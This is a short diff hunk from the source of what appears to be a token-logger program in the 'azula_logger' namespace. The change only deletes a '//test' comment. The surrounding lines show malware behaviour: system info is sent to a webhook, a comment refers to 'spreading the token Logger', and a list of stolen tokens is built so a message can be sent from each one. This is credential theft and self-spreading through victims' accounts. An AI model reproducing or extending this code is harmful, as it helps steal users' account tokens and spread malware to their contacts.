@@ -49,7 +49,6 @@ namespace azula_logger
             wininfo.GetWinInfo(webhook, image);
             //spreading the token Logger
 
-            //test
 
             //making a list with all the tokens so we can try to send a message from all of them
             List<string> tokensss = new List<string>();
